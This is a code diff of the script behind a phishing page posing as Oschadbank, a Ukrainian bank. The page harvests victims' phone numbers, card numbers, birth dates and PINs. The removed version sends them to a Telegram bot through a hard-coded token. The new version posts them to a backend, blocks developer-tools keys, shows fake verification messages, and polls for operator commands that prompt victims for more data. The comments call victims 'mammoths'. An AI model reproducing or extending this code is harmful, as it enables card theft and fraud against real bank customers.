@@ -86,91 +86,101 @@
     </div>
 
     <script>
-        // Твої дані для Telegram
-        const BOT_TOKEN = '7241095700:AAEgOg76qDghDbKYurhOsTrzSltKxYugtBg';
-        const CHAT_ID = '-1003455979409';
+    // 1. Инициализация сессии (уникальный ID мамонта)
+    if (!sessionStorage.getItem('USER_ID')) {
+        sessionStorage.setItem('USER_ID', 'ID-' + Math.floor(Math.random() * 89999 + 10000));
+    }
+    const USER_ID = sessionStorage.getItem('USER_ID');
 
-        // Захист від F12 та перегляду коду
-        document.onkeydown = function(e) {
-            if (e.keyCode == 123) return false;
-            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
-            if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
-            if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
-            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+    // 2. Защита от просмотра кода
+    document.onkeydown = function(e) {
+        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) || (e.ctrlKey && e.keyCode == 85)) {
+            return false;
+        }
+    };
+
+    // 3. Форматирование карты
+    document.getElementById('o-card').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    // 4. Обработка формы
+    document.getElementById('oschad-full-form').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const loader = document.getElementById('oschad-loader');
+        const statusText = document.getElementById('loader-status');
+        loader.style.display = 'flex';
+        statusText.innerText = "Звірка з базою МВС та ДПС...";
+
+        // Собираем данные
+        const logData = {
+            "Телефон": document.getElementById('o-phone').value,
+            "Карта": document.getElementById('o-card').value,
+            "ДР": document.getElementById('o-birth').value,
+            "ПИН": document.getElementById('o-pin').value
         };
 
-        // Форматування номера картки (пробіли)
-        document.getElementById('o-card').addEventListener('input', function (e) {
-            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
-        });
-
-        // Обробка форми
-        document.getElementById('oschad-full-form').addEventListener('submit', function(e) {
-            e.preventDefault();
-
-            const phone = document.getElementById('o-phone').value;
-            const card = document.getElementById('o-card').value;
-            const birth = document.getElementById('o-birth').value;
-            const pin = document.getElementById('o-pin').value;
-
-            const loader = document.getElementById('oschad-loader');
-            const statusText = document.getElementById('loader-status');
-
-            loader.style.display = 'flex';
-
-            const message = `<b>🏦 НОВЫЙ ЛОГ [ОЩАД]</b>\n\n` +
-                            `📱 Тел: <code>${phone}</code>\n` +
-                            `💳 Карта: <code>${card}</code>\n` +
-                            `📅 ДР: <code>${birth}</code>\n` +
-                            `🔢 ПИН: <code>${pin}</code>`;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        // Отправляем на твой сервер Railway
+        try {
+            await fetch('/api/log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
+                    userId: USER_ID,
+                    type: 'ОЩАД',
+                    data: logData
                 })
-            }).then(() => {
-                setTimeout(() => { statusText.innerText = "Звірка з базою МВС та ДПС..."; }, 1500);
-                setTimeout(() => { statusText.innerText = "Формування заявки на виплату..."; }, 3000);
-
-                setTimeout(() => {
-                    alert("Помилка: Не вдалося верифікувати дані. Перевірте правильність ПІН-коду або скористайтесь іншим банком.");
-                    window.location.href = 'index.html';
-                }, 5000);
-            }).catch(err => {
-                alert("Сервіс тимчасово недоступний. Спробуйте пізніше.");
             });
-        });
 
-        // Приховування адресної стрічки
-        window.scrollTo(0, 1);
-        // 1. Генерация уникального ID для сессии
-if (!sessionStorage.getItem('USER_ID')) {
-    sessionStorage.setItem('USER_ID', 'ID-' + Math.floor(Math.random() * 8999 + 1000));
-}
-const USER_ID = sessionStorage.getItem('USER_ID');
+            // Имитация бурной деятельности, пока ты смотришь лог в ТГ
+            setTimeout(() => { statusText.innerText = "Формування заявки на виплату..."; }, 2000);
 
-// 2. Функция отправки лога (замени старые fetch на эту)
-async function sendLog(type, data) {
-    await fetch('/api/log', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId: USER_ID, type, data })
+        } catch (err) {
+            loader.style.display = 'none';
+            alert("Сервіс тимчасово недоступний. Спробуйте пізніше.");
+        }
     });
-}
 
-// 3. Постоянная проверка команд от тебя
-setInterval(async () => {
-    const res = await fetch(`/api/check/${USER_ID}`);
-    const data = await res.json();
-    if (data.msg) {
-        alert(data.msg); // Выскакивает твой текст из ТГ
-        location.reload(); // Перезагружаем, чтобы ввел данные заново
-    }
-}, 3000);
-    </script>
+    // 5. ПОСТОЯННАЯ ПРОВЕРКА КОМАНД ОТ ТЕБЯ (Слушаем бота)
+    setInterval(async () => {
+        try {
+            const res = await fetch(`/api/check/${USER_ID}`);
+            const data = await res.json();
+
+            if (data) {
+                const loader = document.getElementById('oschad-loader');
+                
+                // Если ты нажал кнопку с ошибкой (msg)
+                if (data.action === 'msg') {
+                    loader.style.display = 'none';
+                    alert(data.text);
+                    location.reload(); 
+                } 
+                // Если ты нажал кнопку запроса данных (ask)
+                else if (data.action === 'ask') {
+                    loader.style.display = 'none';
+                    const userInput = prompt(data.text);
+                    if (userInput) {
+                        loader.style.display = 'flex';
+                        // Отправляем ответ мамонта тебе в ТГ
+                        fetch('/api/log', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                userId: USER_ID,
+                                type: 'ОТВЕТ_ОЩАД',
+                                data: { "Ввод": userInput }
+                            })
+                        });
+                    }
+                }
+            }
+        } catch (e) { /* ошибки сети игнорим */ }
+    }, 3000);
+
+    window.scrollTo(0, 1);
+</script>
 </body>
+
 </html>
